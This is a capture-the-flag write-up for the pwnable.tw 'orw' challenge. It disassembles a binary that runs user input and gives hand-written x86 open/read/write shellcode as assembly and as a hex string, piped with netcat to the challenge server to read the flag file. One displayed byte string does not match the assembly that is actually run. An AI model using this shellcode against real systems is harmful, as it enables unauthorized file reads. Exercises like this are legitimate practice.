---
layout: single_c
title:  "Pwnable.tw Level 2 - Orw"
date:   2019-08-16 1:00:16 +0530
categories: Pwnable.tw
tags: Binary-Exploitation
classes: wide
--- 
### [Pwnable.tw Level 2 - Orw](https://pwnable.tw/challenge/#2)  

## Challenge
```
Read the flag from /home/orw/flag.

Only open read write syscall are allowed to use.

nc chall.pwnable.tw 10001
```
## Static Analysis
Lets check the file properties using `file` and `checksec`
```bash
user@ctf:~/Downloads$ file orw
orw: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2,  
for GNU/Linux 2.6.32, BuildID[sha1]=e60ecccd9d01c8217387e8b77e9261a1f36b5030, not stripped

user@ctf:~/Downloads$ ./checksec.sh --file orw
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   Canary found      NX disabled   No PIE          No RPATH   No RUNPATH   orw
```
Let decompile using `gdb`
```bash
gdb-peda$ info functions 
All defined functions:

Non-debugging symbols:
0x08048330  _init
0x08048370  read@plt
0x08048380  printf@plt
0x08048390  __stack_chk_fail@plt
0x080483a0  __libc_start_main@plt
0x080483b0  prctl@plt
0x080483d0  _start
0x08048400  __x86.get_pc_thunk.bx
0x08048410  deregister_tm_clones
0x08048440  register_tm_clones
0x08048480  __do_global_dtors_aux
0x080484a0  frame_dummy
0x080484cb  orw_seccomp
0x08048548  main
0x080485a0  __libc_csu_init
0x08048600  __libc_csu_fini
0x08048604  _fini
```
Lets look at main function
```bash
gdb-peda$ disassemble main
Dump of assembler code for function main:
   0x08048548 <+0>:	lea    ecx,[esp+0x4]
   0x0804854c <+4>:	and    esp,0xfffffff0
   0x0804854f <+7>:	push   DWORD PTR [ecx-0x4]
   0x08048552 <+10>:	push   ebp
   0x08048553 <+11>:	mov    ebp,esp
   0x08048555 <+13>:	push   ecx
   0x08048556 <+14>:	sub    esp,0x4
   0x08048559 <+17>:	call   0x80484cb <orw_seccomp>
   0x0804855e <+22>:	sub    esp,0xc
   0x08048561 <+25>:	push   0x80486a0
   0x08048566 <+30>:	call   0x8048380 <printf@plt>
   0x0804856b <+35>:	add    esp,0x10
   0x0804856e <+38>:	sub    esp,0x4
   0x08048571 <+41>:	push   0xc8
   0x08048576 <+46>:	push   0x804a060
   0x0804857b <+51>:	push   0x0
   0x0804857d <+53>:	call   0x8048370 <read@plt>
   0x08048582 <+58>:	add    esp,0x10
   0x08048585 <+61>:	mov    eax,0x804a060
   0x0804858a <+66>:	call   eax
   0x0804858c <+68>:	mov    eax,0x0
   0x08048591 <+73>:	mov    ecx,DWORD PTR [ebp-0x4]
   0x08048594 <+76>:	leave  
   0x08048595 <+77>:	lea    esp,[ecx-0x4]
   0x08048598 <+80>:	ret    
End of assembler dump.
```

At position `0x08048576` the value `0x804a060` is pushed into the `stack` and then value read from the user is stored at this location and then it is called.

lets set a break point and check 
```bash
gdb-peda$ break *0x0804858a
Breakpoint 1, 0x0804858a in main ()
gdb-peda$ x/2i $eip
=> 0x804858a <main+66>:	call   eax
   0x804858c <main+68>:	mov    eax,0x0
gdb-peda$ print $eax
$1 = 0x804a060
gdb-peda$ x/s $eax
0x804a060 <shellcode>:	"AAAABBBB\n" 
```
So it executes any shellcode we input. So we can simply write any shell code.
Its seems to be too easy and I don't see any limits to the length of shell code either  
My first thought was to pop a shell. But syscalls seems to be limited to `open` `read` and `write`
After trying various unnecessarily complicated shellcodes I got a simple idea  
We can just `open` the flag file then `read` from it and then `write` its contents to standard output  

I used this website for writing the shell code https://defuse.ca/online-x86-assembler.htm

Shell code
```bash
mov eax,5
push 0
push 0x67616c66
push 0x2f2f2f77
push 0x726f2f65
push 0x6d6f682f
mov ebx,esp
xor ecx,ecx
xor edx,edx
int 0x80;; fd = open("/home/orw/flag", 0_RDONLY, 0)

push eax
pop ebx
mov eax,3
mov ecx,0x0804a060
sub ecx,40
mov edx,40
int 0x80;; read(fd, obj.shellcode-40, 40)

mov eax,4
mov ebx,1
mov ecx,0x0804a060
sub ecx,40
mov edx,40
int 0x80;; write(stdout, obj.shellcode-40, 40)


String Literal:

"\xB8\x05\x00\x00\x00\x6A\x00\x68\x66\x6C\x61\x67\x68\x77\x2F\x2F\x2F\x68\x65\x2F\x6F\x72\x68\x2F\x68\x6F\x6D\x89\xE3  
\x31\xC9\x31\xD2\xCD\x80\x50\x5B\xB8\x03\x00\x00\x00\xB9\x60\xA0\x04\x08\x81\xC1\xA0\x00\x00\x00\xBA\x28\x00\x00\x00  
\xCD\x80\xB8\x04\x00\x00\x00\xBB\x01\x00\x00\x00\xB9\x60\xA0\x04\x08\x81\xC1\xA0\x00\x00\x00\xBA\x28\x00\x00\x00\xCD\x80"  

```
The shellcode is the simplest one I could think of. Its not the most efficient or shortest method but it will work    
The shellcode first `opens` the file `/home/orw/flag`  
Then it `reads` from the file using the file `descriptor` returned form `open` to a `40bytes` buffer above shell code  
Then we `write` the output to standard output

Lets try it on local system first and then on the server
```bash
user@ctf:~/Downloads$ python -c 'print "\xB8\x05\x00\x00\x00\x6A\x00\x68\x66\x6C\x61\x67\x68\x77\x2F\x2F\x2F\x68  
\x65\x2F\x6F\x72\x68\x2F\x68\x6F\x6D\x89\xE3\x31\xC9\x31\xD2\xCD\x80\x50\x5B\xB8\x03\x00\x00\x00\xB9\x60\xA0\x04  
\x08\x83\xE9\x28\xBA\x28\x00\x00\x00\xCD\x80\xB8\x04\x00\x00\x00\xBB\x01\x00\x00\x00\xB9\x60\xA0\x04\x08\x83\xE9  
\x28\xBA\x28\x00\x00\x00\xCD\x80"' | ./orw
Give my your shellcode:hey there you in flag
Segmentation fault (core dumped)
```
And there we have it. Let's run it on the server
```bash
user@ctf:~/Downloads$ python -c 'print "\xB8\x05\x00\x00\x00\x6A\x00\x68\x66\x6C\x61\x67\x68\x77\x2F\x2F\x2F\x68  
\x65\x2F\x6F\x72\x68\x2F\x68\x6F\x6D\x89\xE3\x31\xC9\x31\xD2\xCD\x80\x50\x5B\xB8\x03\x00\x00\x00\xB9\x60\xA0\x04  
\x08\x83\xE9\x28\xBA\x28\x00\x00\x00\xCD\x80\xB8\x04\x00\x00\x00\xBB\x01\x00\x00\x00\xB9\x60\xA0\x04\x08\x83\xE9  
\x28\xBA\x28\x00\x00\x00\xCD\x80"' | nc chall.pwnable.tw 10001
Give my your shellcode:FLAG{xxxxxxxxxxx}
```
### Solved!

